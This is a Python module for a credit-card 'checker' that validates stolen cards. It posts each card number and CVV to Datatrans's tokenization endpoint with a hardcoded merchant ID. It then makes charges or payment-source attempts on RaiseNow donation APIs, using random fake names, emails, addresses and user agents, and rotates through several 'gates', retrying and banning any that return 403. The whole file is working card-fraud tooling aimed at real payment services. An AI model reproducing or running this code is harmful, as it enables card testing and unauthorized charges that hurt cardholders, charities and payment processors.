import time
import requests
import json
import random
import string
import logging
import importlib

# --- MODIFIED: Import the module to allow reloading ---
import gate_configurations as gate_configs_module
# Reload the module on initial import to ensure it's fresh
importlib.reload(gate_configs_module)


logger = logging.getLogger(__name__)

# --- UTILITY FUNCTIONS (COPIED FROM main.py for consistency) ---

def generate_random_string(length=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def random_email(config):
    """Creates a random email based on the gate's configuration."""
    min_len, max_len = config['text_length_range']
    num_digits = config['append_digits']
    
    text_part = ''.join(random.choices(string.ascii_lowercase, k=random.randint(min_len, max_len)))
    number_part = ''
    if num_digits > 0:
        number_part = ''.join(random.choices(string.digits, k=num_digits))
        
    prefix = f"{text_part}{number_part}"
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    win_version = "10.0; Win64; x64"
    return (f"Mozilla/5.0 (Windows NT {win_version}) "
            f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
            f"Chrome/{chrome_version} Safari/{safari_version}")

# --- REWRITTEN CHECKER LOGIC ---

def _perform_single_request(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
    """
    Internal function to perform a single check attempt against a specific gate.
    This function does NOT handle retries. It just returns the raw result.
    """
    try:
        user_agent = random_user_agent()
        min_name, max_name = gate_config['name_length_range']
        first_name = generate_random_string(random.randint(min_name, max_name))
        last_name = generate_random_string(random.randint(min_name, max_name))
        cardholder = f"{first_name} {last_name}"
        email = random_email(gate_config['email_config'])
        
        street = generate_random_string(random.randint(20, 35))
        house_number = generate_random_string(random.randint(20, 35))
        postal_code = ''.join(random.choices(string.digits, k=5))
        city = generate_random_string(random.randint(20, 35))
        random_message = generate_random_string(random.randint(20, 35))

        # --- Step 1: Tokenize ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
        tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        
        token_response = session.post(tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
        
        if token_response.status_code == 403:
            return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Tokenize", bin_info

        token_response.raise_for_status() # Raise HTTPError for other bad responses (4xx, 5xx)

        if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
        
        token_data = token_response.json()
        if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
        transaction_id = token_data.get("transactionId")
        if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info

        # --- Step 2: Payment ---
        payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
        
        payload_str = json.dumps(gate_config['payload'])
        replacements = {
            "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
            "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
            "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
            "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
            "{{message}}": random_message
        }
        for placeholder, value in replacements.items():
            payload_str = payload_str.replace(placeholder, value)
        
        base_payload = json.loads(payload_str)

        if mode == 'charge':
            payment_url = "https://api.raisenow.io/payments"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
        else: # 'live' mode
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = base_payload
            payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50}

        payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=20)
        
        if payment_response.status_code == 403:
            return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Payment", bin_info
            
        payment_response.raise_for_status()

        response_text = payment_response.text
        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
        elif '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
            return 'decline', line, f'[{gate_name}] DECLINED', bin_info
        elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
            return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
        else:
            return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info

    except requests.exceptions.RequestException as e:
        logger.warning(f"Request failed for gate '{gate_name}': {e}")
        return 'error', line, f"[{gate_name}] Connection Error: {e}", bin_info
    except json.JSONDecodeError as e:
        return 'error', line, f"[{gate_name}] JSON Decode Error: {e}", bin_info
    except Exception as e:
        logger.error(f"Critical error in Generic Checker for gate '{gate_name}': {e}", exc_info=True)
        return 'error', line, f"[{gate_name}] System Error: {e}", bin_info


def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, custom_charge_amount, available_gates, retry_policy):
    """
    REWRITTEN LOGIC:
    Checks a single card against a list of available gates, handling retries and banning.
    
    Args:
        available_gates (list): A list of gate names to try.
        retry_policy (dict): A dictionary containing the number of retries, e.g., {'retries': 10}.
        
    Returns:
        A tuple (status, line, response, bin_info).
        - If successful: ('success', line, '...', bin_info)
        - If a gate needs to be banned: ('needs_ban', line, 'gate_name_to_ban', bin_info)
        - If all provided gates fail: ('all_gates_failed', line, 'Error message', bin_info)
    """
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', bin_info

    mode = get_mode_func()
    charge_value = custom_charge_amount if custom_charge_amount is not None else 50
    
    # Loop through each available gate for the CURRENT card
    for gate_name in available_gates:
        if cancellation_event and cancellation_event.is_set():
            return 'cancelled', line, 'User cancelled', bin_info

        try:
            gate_config = gate_configs_module.GATE_CONFIGS[gate_name]
        except KeyError:
            logger.warning(f"Gate '{gate_name}' not found in configuration, skipping.")
            continue # Skip to the next gate if this one isn't configured

        # Inner loop for retrying a SINGLE gate
        for attempt in range(retry_policy['retries']):
            if cancellation_event and cancellation_event.is_set():
                return 'cancelled', line, 'User cancelled', bin_info
                
            status, _, response, _ = _perform_single_request(
                session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
                mode, charge_value, gate_name, gate_config
            )
            
            # Check if the error is a type that should be retried
            is_retryable_error = (
                status == 'gate_dead' or 
                (status == 'error' and response and ("Connection Error" in str(response) or "Proxy Error" in str(response) or "HTTP Error" in str(response)))
            )

            if is_retryable_error:
                if attempt < retry_policy['retries'] - 1:
                    logger.warning(f"Card {line} on Gate '{gate_name}' failed (Attempt {attempt + 1}/{retry_policy['retries']}). Retrying...")
                    time.sleep(1) # Wait before retrying the SAME gate
                    continue
                else:
                    # All retries for THIS gate failed. Signal to the main worker to ban it.
                    logger.error(f"Card {line} on Gate '{gate_name}' failed after {retry_policy['retries']} retries. Signaling for ban.")
                    status = 'needs_ban'
                    response = gate_name # The response is the gate to ban
                    break # Exit the retry loop for this gate
            else:
                # Got a definitive result (success, decline, 3d, etc.) or a non-retryable error
                break # Exit the retry loop for this gate
        
        # After the retry loop, check the result
        if status == 'needs_ban':
            # This gate failed permanently, continue to the next available gate
            continue
        else:
            # We got a definitive result for the card, so we can stop checking other gates
            return status, line, response, bin_info

    # If this point is reached, it means the card was tried against all available_gates, and every single one of them failed and was banned.
    return 'all_gates_failed', line, "All available gates failed for this card.", bin_info
